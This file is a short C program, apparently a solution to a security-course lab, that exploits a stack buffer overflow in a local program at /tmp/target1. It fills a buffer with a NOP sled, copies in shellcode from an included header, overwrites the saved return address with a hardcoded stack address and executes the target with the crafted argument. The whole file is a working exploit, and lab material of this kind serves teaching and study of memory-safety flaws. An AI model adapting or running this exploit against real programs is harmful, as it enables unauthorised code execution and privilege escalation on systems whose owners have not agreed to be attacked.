#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  // put '\0' at the end
  char sploitstring[256 + 2 * sizeof(int) + 1];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;

  // shellcode is a string which ends with '\0'
  // should not copy '\0' to buffer otherwise
  // there wont be a buffer overflow
  memcpy(sploitstring + 100, shellcode, sizeof(shellcode) - 1);

  // address of eip
  int *ret = (int *) (sploitstring + 256 + sizeof(int));
  *ret = 0xbffffc5c;


  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
